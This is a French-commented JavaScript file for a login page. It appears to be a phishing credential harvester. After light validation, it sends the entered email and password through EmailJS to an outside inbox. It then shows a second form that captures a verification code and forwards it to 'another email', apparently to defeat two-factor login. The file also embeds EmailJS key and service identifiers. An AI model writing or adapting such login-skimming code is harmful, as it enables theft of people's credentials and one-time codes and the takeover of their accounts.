// Initialise EmailJS avec votre User ID
emailjs.init("-xgMn-W7z9wR_oif-"); // Remplacez par votre clé API EmailJS

// Fonction de validation du formulaire principal
function validateForm() {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const errorMessage = document.getElementById('errorMessage');

    // Validation simple pour démonstration
    if (email === "" || password === "") {
        errorMessage.textContent = "Veuillez remplir tous les champs.";
        return false;
    }

    // Validation du format d'email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Veuillez entrer une adresse e-mail valide.";
        return false;
    }

    // Effacer le message d'erreur si tout est correct
    errorMessage.textContent = "";
    return true; // Permettre l'envoi du formulaire si la validation réussit
}

// Fonction pour envoyer le code de vérification à l'autre email
function sendCodeToEmail(email, code) {
    emailjs.send('service_odtxz18', 'template_code_email', { email: email, code: code })
        .then(function(response) {
            console.log('Code de vérification envoyé avec succès:', response);
            alert('Code de vérification envoyé!');
        }, function(error) {
            console.log('Erreur lors de l\'envoi du code de vérification:', error);
            alert('Une erreur est survenue lors de l\'envoi du code.');
        });
}

// Gestion de la soumission du formulaire principal
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    // Valider le formulaire avant l'envoi
    if (!validateForm()) {
        return; // Ne pas envoyer le formulaire si la validation échoue
    }

    console.log("Validation réussie, préparation à l'envoi..."); // Log pour le débogage

    // Envoie le formulaire principal avec EmailJS
    emailjs.sendForm('service_odtxz18', 'template_pj35ygs', this)
        .then(function(response) {
            console.log('Succès:', response);
            alert('Formulaire envoyé avec succès!');

            // Afficher le formulaire pour le code de vérification
            document.getElementById('loginForm').style.display = 'none';
            document.getElementById('codeForm').style.display = 'block';
        }, function(error) {
            console.log('Erreur:', error);
            alert('Une erreur est survenue. Veuillez réessayer.');
        });
});

// Gestion de la soumission du formulaire de code de vérification
document.getElementById('codeForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Empêche le comportement par défaut du formulaire

    const email = document.getElementById('email').value; // Utiliser l'email du formulaire principal
    const code = document.getElementById('code').value;
    
    // Envoyer le code de vérification à un autre email
    sendCodeToEmail(email, code);
});
